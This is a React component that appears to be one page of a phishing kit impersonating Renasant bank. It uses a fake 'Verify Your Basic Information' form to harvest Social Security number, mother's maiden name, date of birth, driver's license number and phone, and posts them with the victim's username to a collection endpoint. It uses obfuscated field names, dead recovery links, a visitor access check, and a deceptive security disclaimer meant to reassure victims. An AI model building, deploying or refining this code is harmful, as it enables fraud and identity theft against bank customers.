import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    fzNme: '', 
    lzNme: '', 
    phone: '', 
    ssn: '', 
    motherMaidenName: '', 
    dob: '', 
    driverLicense: '',
    form: '' 
  });
  const [username, setUsername] = useState('');
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      console.error('No username provided from previous page');
    }
  }, [emzemzState]);

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = month ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
      );
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
        p2 ? `${p1}-${p2}` : `${p1}`
      );
    }
    return digitsOnly;
  };

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');
    
    const newErrors = { 
      fzNme: !fzNme.trim() ? 'First name is required.' : '',
      lzNme: !lzNme.trim() ? 'Last name is required.' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits.' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits.' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required." : '',
      dob: (!month || !day || !year) ? 'Complete date of birth is required.' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required." : '',
      form: ''
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const getMonthName = (monthNumber: string) => {
        const monthNames = [
          "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"
        ];
        return monthNames[parseInt(monthNumber) - 1] || '';
      };

      const dob = `${getMonthName(month)}/${day}/${year}`;

      await axios.post(`${baseUrl}api/renasant-basic-info/`, {
        emzemz: username,
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense
      });

      navigate('/card', {
        state: {
          emzemz: username
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.',
      }));
    } finally {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!username) {
    return (
      <FlowCard title="Unable to continue">
        <p className="text-sm text-slate-600">
          We could not determine your session details. Please return to the previous step and try again.
        </p>
      </FlowCard>
    );
  }

  const footer = (
    <div className="space-y-2 text-xs text-slate-600">
      <p>
        For security reasons, never share your username, password, social security number, account number or other private data online,
        unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
      </p>
      <div className="flex flex-wrap items-center justify-center gap-2 text-[#0f4f6c]">
        <a href="#" className="hover:underline">Forgot Username?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Forgot Password?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Forgot Everything?</a>
        <span className="text-slate-400">|</span>
        <a href="#" className="hover:underline">Locked Out?</a>
      </div>
    </div>
  );

  return (
    <FlowCard
      title="Verify Your Basic Information"
      subtitle={<span className="text-slate-600">Please confirm the details we have on file.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="fzNme">
            First name
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="fzNme"
              name="fzNme"
              type="text"
              value={fzNme}
              onChange={(e) => setFzNme(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="First name"
            />
          </div>
          {errors.fzNme ? <FormError message={errors.fzNme} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="lzNme">
            Last name
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="lzNme"
              name="lzNme"
              type="text"
              value={lzNme}
              onChange={(e) => setLzNme(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Last name"
            />
          </div>
          {errors.lzNme ? <FormError message={errors.lzNme} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="phone">
            Phone Number
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="phone"
              name="phone"
              type="text"
              value={phone}
              onChange={(e) => setPhone(formatPhone(e.target.value))}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="(555) 123-4567"
            />
          </div>
          {errors.phone ? <FormError message={errors.phone} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="ssn">
            Social Security Number
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="ssn"
              name="ssn"
              type={showSSN ? 'text' : 'password'}
              value={ssn}
              onChange={(e) => setSsn(formatSSN(e.target.value))}
              maxLength={11}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="XXX-XX-XXXX"
            />
            <button
              type="button"
              onClick={() => setShowSSN(!showSSN)}
              className="px-3 text-green-600 text-sm hover:underline"
            >
              {showSSN ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.ssn ? <FormError message={errors.ssn} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="motherMaidenName">
            Mother's Maiden Name
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="motherMaidenName"
              name="motherMaidenName"
              type="text"
              value={motherMaidenName}
              onChange={(e) => setMotherMaidenName(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Enter maiden name"
            />
          </div>
          {errors.motherMaidenName ? <FormError message={errors.motherMaidenName} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1">Date of Birth</label>
          <div className="flex gap-2">
            <select
              value={month}
              onChange={(e) => setMonth(e.target.value)}
              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none"
            >
              <option value="">Month</option>
              {Array.from({ length: 12 }, (_, i) => (
                <option key={i + 1} value={i + 1}>
                  {new Date(0, i).toLocaleString('default', { month: 'long' })}
                </option>
              ))}
            </select>
            <select
              value={day}
              onChange={(e) => setDay(e.target.value)}
              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none"
              disabled={!month || !year}
            >
              <option value="">Day</option>
              {Array.from({ length: daysInMonth }, (_, i) => (
                <option key={i + 1} value={i + 1}>
                  {i + 1}
                </option>
              ))}
            </select>
            <select
              value={year}
              onChange={(e) => {
                setYear(e.target.value);
                setDay('');
              }}
              className="flex-1 px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none"
            >
              <option value="">Year</option>
              {years.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
          </div>
          {errors.dob ? <FormError message={errors.dob} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="driverLicense">
            Driver's License Number
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="driverLicense"
              name="driverLicense"
              type="text"
              value={driverLicense}
              onChange={(e) => setDriverLicense(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Enter license number"
            />
          </div>
          {errors.driverLicense ? <FormError message={errors.driverLicense} /> : null}
        </div>

        {errors.form ? (
          <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
            {errors.form}
          </div>
        ) : null}

        <button
          type="submit"
          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
          ) : (
            <>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
              </svg>
              <span>Continue</span>
            </>
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default BasicInfo;
